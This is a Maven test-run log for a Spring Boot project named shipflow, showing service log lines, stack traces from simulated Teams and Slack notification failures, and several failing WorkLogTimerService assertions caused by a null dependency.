2026-01-17T23:26:54.145Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.s.teams.TeamsIntegrationService  : Notification type TASK_BLOCKED is disabled for channel General
2026-01-17T23:26:54.151Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.teams.TeamsIntegrationService  : Sent Teams notification: TASK_ASSIGNED to channel: General
2026-01-17T23:26:54.153Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.teams.TeamsIntegrationService  : Created/updated Teams configuration for tenant: Test Tenant
2026-01-17T23:26:54.154Z ERROR 89700 --- [shipflow] [           main] c.g.f.s.s.teams.TeamsIntegrationService  : Failed to send Teams notification: Network error

java.lang.RuntimeException: Network error
	at org.springframework.web.client.RestTemplate.postForEntity(RestTemplate.java:527) ~[spring-web-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.service.teams.TeamsIntegrationService.sendNotification(TeamsIntegrationService.java:194) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.teams.TeamsIntegrationServiceTest.sendNotification_RestTemplateFails_ShouldRecordFailure(TeamsIntegrationServiceTest.java:283) ~[test-classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728) ~[junit-platform-commons-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495) ~[surefire-booter-3.1.2.jar:3.1.2]

2026-01-17T23:26:54.156Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.teams.TeamsIntegrationService  : Created/updated Teams configuration for tenant: Test Tenant
2026-01-17T23:26:54.157Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.s.teams.TeamsIntegrationService  : No active Teams configuration found, skipping notification
2026-01-17T23:26:54.157Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.teams.TeamsIntegrationService  : Sent test notification to Teams tenant: Test Tenant
2026-01-17T23:26:54.158Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.teams.TeamsIntegrationService  : Deleted channel configuration: 1
2026-01-17T23:26:54.159Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.teams.TeamsIntegrationService  : Deleted Teams configuration: 1
2026-01-17T23:26:54.160Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.teams.TeamsIntegrationService  : Created/updated channel configuration: dev-team for Teams config: 1
[INFO] Tests run: 17, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.272 s -- in com.github.farzadsedaghatbin.shipflow.service.teams.TeamsIntegrationServiceTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.DashboardWidgetServiceTest
2026-01-17T23:26:54.220Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.DashboardWidgetService   : Reset widgets to defaults for user 1
2026-01-17T23:26:54.221Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.DashboardWidgetService   : Bulk updated 2 widgets for user 1
2026-01-17T23:26:54.222Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.DashboardWidgetService   : Deleted widget 1
2026-01-17T23:26:54.222Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.DashboardWidgetService   : Creating default widgets for user 1
2026-01-17T23:26:54.223Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.DashboardWidgetService   : Updated widget 1
2026-01-17T23:26:54.223Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.DashboardWidgetService   : Created widget NEW_WIDGET for user 1
[INFO] Tests run: 9, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.063 s -- in com.github.farzadsedaghatbin.shipflow.service.DashboardWidgetServiceTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.slack.SlackIntegrationServiceTest
2026-01-17T23:26:54.389Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.slack.SlackIntegrationService  : Created/updated channel configuration: engineering for Slack config: 1
2026-01-17T23:26:54.390Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.slack.SlackIntegrationService  : Created/updated Slack configuration for workspace: test-workspace
2026-01-17T23:26:54.391Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.slack.SlackIntegrationService  : Created/updated Slack configuration for workspace: test-workspace
2026-01-17T23:26:54.391Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.slack.SlackIntegrationService  : Deleted Slack configuration: 1
2026-01-17T23:26:54.391Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.slack.SlackIntegrationService  : Created/updated channel configuration: engineering for Slack config: 1
2026-01-17T23:26:54.392Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.s.slack.SlackIntegrationService  : Notification type TASK_BLOCKED is disabled for channel engineering
2026-01-17T23:26:54.393Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.slack.SlackIntegrationService  : Sent Slack notification: TASK_ASSIGNED to channel: engineering
2026-01-17T23:26:54.394Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.slack.SlackIntegrationService  : Deleted channel configuration: 1
2026-01-17T23:26:54.394Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.s.slack.SlackIntegrationService  : No active Slack configuration found, skipping notification
2026-01-17T23:26:54.395Z ERROR 89700 --- [shipflow] [           main] c.g.f.s.s.slack.SlackIntegrationService  : Failed to send Slack notification: Connection failed

java.lang.RuntimeException: Connection failed
	at org.springframework.web.client.RestTemplate.postForEntity(RestTemplate.java:527) ~[spring-web-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.service.slack.SlackIntegrationService.sendNotification(SlackIntegrationService.java:199) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.slack.SlackIntegrationServiceTest.sendNotification_Failure_ShouldLogError(SlackIntegrationServiceTest.java:299) ~[test-classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728) ~[junit-platform-commons-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495) ~[surefire-booter-3.1.2.jar:3.1.2]

[INFO] Tests run: 15, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.172 s -- in com.github.farzadsedaghatbin.shipflow.service.slack.SlackIntegrationServiceTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.WorkLogTimerServiceTest
2026-01-17T23:26:54.456Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.WorkLogTimerService      : Started timer 1 for person Test Person
2026-01-17T23:26:54.458Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.WorkLogTimerService      : Cancelled timer 1 for person Test Person
2026-01-17T23:26:54.459Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.WorkLogTimerService      : Started timer 1 for person Test Person
2026-01-17T23:26:54.460Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.WorkLogTimerService      : Stopped timer 1 and created work log 1 for 0.75 hours
2026-01-17T23:26:54.462Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.WorkLogTimerService      : Stopped timer 1 and created work log 1 for 0.25 hours
[ERROR] Tests run: 11, Failures: 3, Errors: 0, Skipped: 0, Time elapsed: 0.066 s <<< FAILURE! -- in com.github.farzadsedaghatbin.shipflow.service.WorkLogTimerServiceTest
[ERROR] com.github.farzadsedaghatbin.shipflow.service.WorkLogTimerServiceTest.shouldFailWhenActiveTimerExists -- Time elapsed: 0.001 s <<< FAILURE!
java.lang.AssertionError: 

Expecting actual throwable to be an instance of:
  com.github.farzadsedaghatbin.shipflow.exception.BadRequestException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String)" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.WorkLogTimerService.startTimer(WorkLogTimerService.java:46)
	at com.github.farzadsedaghatbin.shipflow.service.WorkLogTimerServiceTest.lambda$shouldFailWhenActiveTimerExists$2(WorkLogTimerServiceTest.java:204)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	...(73 remaining lines not displayed - this can be changed with Assertions.setMaxStackTraceElementsDisplayed)
	at com.github.farzadsedaghatbin.shipflow.service.WorkLogTimerServiceTest.shouldFailWhenActiveTimerExists(WorkLogTimerServiceTest.java:205)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)

[ERROR] com.github.farzadsedaghatbin.shipflow.service.WorkLogTimerServiceTest.shouldFailWhenNoPitchOrTask -- Time elapsed: 0.001 s <<< FAILURE!
java.lang.AssertionError: 

Expecting actual throwable to be an instance of:
  com.github.farzadsedaghatbin.shipflow.exception.BadRequestException
but was:
  java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String)" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.WorkLogTimerService.startTimer(WorkLogTimerService.java:40)
	at com.github.farzadsedaghatbin.shipflow.service.WorkLogTimerServiceTest.lambda$shouldFailWhenNoPitchOrTask$0(WorkLogTimerServiceTest.java:167)
